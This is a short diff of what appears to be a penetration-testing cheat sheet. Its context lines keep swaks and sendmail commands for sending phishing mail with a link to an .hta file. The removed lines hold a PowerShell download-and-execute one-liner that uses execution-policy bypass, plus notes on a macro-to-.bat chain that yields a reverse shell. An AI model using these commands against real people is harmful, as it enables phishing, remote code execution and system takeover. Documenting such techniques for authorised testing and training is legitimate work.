@@ -879,21 +879,7 @@ swaks --body 'click me http://192.168.X.X/file.hta' --add-header
  ```
  sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
 ```
-
-### Bringing it home
-
-- ### Save file as .bat and host on your server
-
-```
-powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/ps.txt')"
-```
-
-```
-When the macro is clicked it will first download the .bat file and execute.
-Then the .bat file will download and execute your .txt file resulting in a revshell
-```
-
-
+<br>
 
 # Powershell
 <br>
